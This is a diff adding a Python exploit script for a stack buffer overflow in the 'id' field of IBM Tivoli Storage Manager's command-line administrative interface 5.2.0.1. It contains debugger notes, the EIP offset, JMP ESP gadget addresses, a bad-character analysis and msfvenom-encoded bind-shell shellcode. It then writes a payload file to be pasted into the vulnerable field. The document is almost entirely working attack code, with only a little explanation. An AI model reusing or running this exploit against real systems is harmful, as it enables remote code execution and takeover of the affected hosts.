@@ -1,0 +1,141 @@
+# Exploit Title: IBM Tivoli Storage Manager Command Line Administrative Interface 5.2.0.1 - id' Field Stack Based Buffer Overflow
+# Exploit Author: Paolo Stagno aka VoidSec
+# Vendor Homepage: https://www.ibm.com/support/knowledgecenter/en/SSGSG7_7.1.0/com.ibm.itsm.tsm.doc/welcome.html
+# Version: 5.2.0.1
+# Tested on: Windows 10 Pro v.10.0.19041 Build 19041
+
+"""
+Usage:              IBM Tivoli Storage Manager > in the "id" field paste the content of "IBM_TSM_v.5.2.0.1_exploit.txt" and press "ENTER"
+
+PS C:\Users\user\Desktop> Import-Module .\Get-PESecurity.psm1
+PS C:\Users\user\Desktop> Get-PESecurity -file "dsmadmc.exe"                   
+FileName         : dsmadmc.exe
+ARCH             : I386
+DotNET           : False
+ASLR             : True
+DEP              : True
+Authenticode     : False
+StrongNaming     : N/A
+SafeSEH          : False
+ControlFlowGuard : False
+HighentropyVA    : False
+"""
+
+# [ buffer                              ]
+# [ 68 byte | EIP | rest of the buffer  ]
+#                   ^_ESP
+"""
+EIP contains normal pattern : 0x33634132 (offset 68)
+ESP (0x0019e314) points at offset 72 in normal pattern (length 3928)
+
+JMP ESP Pointers:
+0x028039eb : jmp esp |  {PAGE_EXECUTE_READ} [dbghelp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v6.0.0017.0
+0x02803d7b : jmp esp |  {PAGE_EXECUTE_READ} [dbghelp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v6.0.0017.0 
+0x02852c21 : jmp esp |  {PAGE_EXECUTE_READ} [dbghelp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v6.0.0017.0
+0x0289fbe3 : call esp |  {PAGE_EXECUTE_READ} [dbghelp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v6.0.0017.0
+0x0289fd2f : call esp |  {PAGE_EXECUTE_READ} [dbghelp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v6.0.0017.0
+0x028823a9 : push esp # ret 0x04 |  {PAGE_EXECUTE_READ} [dbghelp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v6.0.0017.0
+"""
+
+#!/usr/bin/python
+import struct
+
+# 4000 bytes
+buff_max_length=800
+eip_offset=68
+"""
+BAD CHARS:	\x00\x08\x09\x0a\x0d\x1a\x1b\x7f
+
+GOOD CHARS: 
+    asciiprint 	\x20-\x7e
+
+MOD CHARS: 
+		\x00 -> \x20
+       ,-----------------------------------------------.
+       | Comparison results:                           |
+       |-----------------------------------------------|
+       |                        80 81 82 83 84 85 86 87| File
+       |                        3f 3f 2c 9f 2c 2e 2b d8| Memory
+    80 |88 89 8a 8b 8c 8d 8e 8f 90 91 92 93 94 95 96 97| File
+       |5e 25 53 3c 4f 3f 5a 3f 3f 60 27 22 22 07 2d 2d| Memory
+    90 |98 99 9a 9b 9c 9d 9e 9f a0 a1 a2 a3 a4 a5 a6 a7| File
+       |7e 54 73 3e 6f 3f 7a 59 20 ad 9b 9c 0f 9d dd 15| Memory
+    a0 |a8 a9 aa ab ac ad ae af b0 b1 b2 b3 b4 b5 b6 b7| File
+       |22 63 a6 ae aa 2d 72 5f f8 f1 fd 33 27 e6 14 fa| Memory
+    b0 |b8 b9 ba bb bc bd be bf c0 c1 c2 c3 c4 c5 c6 c7| File
+       |2c 31 a7 af ac ab 5f a8 41 41 41 41 8e 8f 92 80| Memory
+    c0 |c8 c9 ca cb cc cd ce cf d0 d1 d2 d3 d4 d5 d6 d7| File
+       |45 90 45 45 49 49 49 49 44 a5 4f 4f 4f 4f 99 78| Memory
+    d0 |d8 d9 da db dc dd de df e0 e1 e2 e3 e4 e5 e6 e7| File
+       |4f 55 55 55 9a 59 5f e1 85 a0 83 61 84 86 91 87| Memory
+    e0 |e8 e9 ea eb ec ed ee ef f0 f1 f2 f3 f4 f5 f6 f7| File
+       |8a 82 88 89 8d a1 8c 8b 64 a4 95 a2 93 6f 94 f6| Memory
+    f0 |f8 f9 fa fb fc fd fe ff                        | File
+       |6f 97 a3 96 81 79 5f 98                        | Memory
+       `-----------------------------------------------'
+"""
+# msfvenom -p windows/shell_bind_tcp -f python -v shellcode -a x86 --platform windows -b "\x00\x08\x09\x0a\x0d\x1a\x1b\x7f" -e x86/alpha_mixed BufferRegister=ESP --smallest
+shellcode =  b""
+shellcode += b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49"
+shellcode += b"\x49\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a"
+shellcode += b"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51"
+shellcode += b"\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
+shellcode += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x78\x59\x78"
+shellcode += b"\x6b\x4d\x4b\x6b\x69\x62\x54\x61\x34\x6a\x54"
+shellcode += b"\x76\x51\x6a\x72\x6c\x72\x54\x37\x45\x61\x4f"
+shellcode += b"\x39\x61\x74\x4e\x6b\x62\x51\x66\x50\x6c\x4b"
+shellcode += b"\x53\x46\x34\x4c\x6c\x4b\x32\x56\x35\x4c\x6e"
+shellcode += b"\x6b\x67\x36\x37\x78\x6e\x6b\x43\x4e\x51\x30"
+shellcode += b"\x4c\x4b\x67\x46\x74\x78\x50\x4f\x72\x38\x42"
+shellcode += b"\x55\x6c\x33\x30\x59\x56\x61\x38\x51\x39\x6f"
+shellcode += b"\x49\x71\x73\x50\x4e\x6b\x70\x6c\x31\x34\x54"
+shellcode += b"\x64\x6e\x6b\x73\x75\x67\x4c\x4e\x6b\x66\x34"
+shellcode += b"\x46\x48\x74\x38\x45\x51\x69\x7a\x4c\x4b\x31"
+shellcode += b"\x5a\x67\x68\x6e\x6b\x42\x7a\x51\x30\x46\x61"
+shellcode += b"\x6a\x4b\x68\x63\x36\x54\x47\x39\x6c\x4b\x35"
+shellcode += b"\x64\x6c\x4b\x67\x71\x5a\x4e\x74\x71\x6b\x4f"
+shellcode += b"\x64\x71\x6f\x30\x59\x6c\x6c\x6c\x6f\x74\x39"
+shellcode += b"\x50\x50\x74\x43\x37\x49\x51\x58\x4f\x34\x4d"
+shellcode += b"\x77\x71\x6f\x37\x5a\x4b\x6c\x34\x35\x6b\x53"
+shellcode += b"\x4c\x35\x74\x35\x78\x73\x45\x48\x61\x6c\x4b"
+shellcode += b"\x42\x7a\x75\x74\x66\x61\x5a\x4b\x50\x66\x4c"
+shellcode += b"\x4b\x46\x6c\x70\x4b\x4e\x6b\x31\x4a\x77\x6c"
+shellcode += b"\x76\x61\x68\x6b\x4e\x6b\x53\x34\x6c\x4b\x53"
+shellcode += b"\x31\x4a\x48\x4e\x69\x37\x34\x56\x44\x65\x4c"
+shellcode += b"\x70\x61\x38\x43\x4f\x42\x45\x58\x61\x39\x38"
+shellcode += b"\x54\x6f\x79\x48\x65\x4f\x79\x59\x52\x43\x58"
+shellcode += b"\x4c\x4e\x32\x6e\x36\x6e\x7a\x4c\x72\x72\x49"
+shellcode += b"\x78\x4f\x6f\x4b\x4f\x6b\x4f\x6b\x4f\x4e\x69"
+shellcode += b"\x42\x65\x54\x44\x6f\x4b\x73\x4e\x68\x58\x4b"
+shellcode += b"\x52\x44\x33\x6c\x47\x75\x4c\x37\x54\x42\x72"
+shellcode += b"\x4d\x38\x6e\x6e\x69\x6f\x59\x6f\x49\x6f\x6d"
+shellcode += b"\x59\x57\x35\x73\x38\x70\x68\x32\x4c\x52\x4c"
+shellcode += b"\x67\x50\x71\x51\x75\x38\x65\x63\x76\x52\x76"
+shellcode += b"\x4e\x42\x44\x61\x78\x34\x35\x54\x33\x71\x75"
+shellcode += b"\x73\x42\x70\x30\x79\x4b\x6b\x38\x61\x4c\x31"
+shellcode += b"\x34\x57\x7a\x4c\x49\x59\x76\x31\x46\x69\x6f"
+shellcode += b"\x33\x65\x67\x74\x4f\x79\x6a\x62\x32\x70\x6d"
+shellcode += b"\x6b\x4d\x78\x6f\x52\x42\x6d\x4f\x4c\x6f\x77"
+shellcode += b"\x55\x4c\x75\x74\x53\x62\x79\x78\x61\x4f\x79"
+shellcode += b"\x6f\x6b\x4f\x79\x6f\x30\x68\x42\x4f\x62\x58"
+shellcode += b"\x63\x68\x77\x50\x73\x58\x70\x61\x30\x67\x33"
+shellcode += b"\x55\x50\x42\x43\x58\x32\x6d\x70\x65\x61\x63"
+shellcode += b"\x32\x53\x76\x51\x69\x4b\x6d\x58\x33\x6c\x51"
+shellcode += b"\x34\x35\x5a\x4b\x39\x6b\x53\x72\x48\x70\x58"
+shellcode += b"\x47\x50\x55\x70\x57\x50\x42\x48\x62\x50\x63"
+shellcode += b"\x47\x70\x6e\x35\x34\x34\x71\x6f\x39\x4c\x48"
+shellcode += b"\x30\x4c\x74\x64\x67\x74\x6e\x69\x4b\x51\x54"
+shellcode += b"\x71\x58\x52\x62\x72\x36\x33\x62\x71\x71\x42"
+shellcode += b"\x79\x6f\x68\x50\x74\x71\x79\x50\x76\x30\x69"
+shellcode += b"\x6f\x50\x55\x54\x48\x41\x41"
+
+buff = ""
+buff += "A" * eip_offset
+buff += struct.pack("<I",0x02c73d7b) #  0x02803d7b cause char modification needs to be written as 0x02c73d7b
+buff += shellcode
+buff += "C" * (buff_max_length - len(buff))
+
+print("Writing {} bytes".format(len(buff)))
+f = open("IBM_TSM_v.5.2.0.1_exploit.txt", "w")
+f.write(buff)
+f.close()
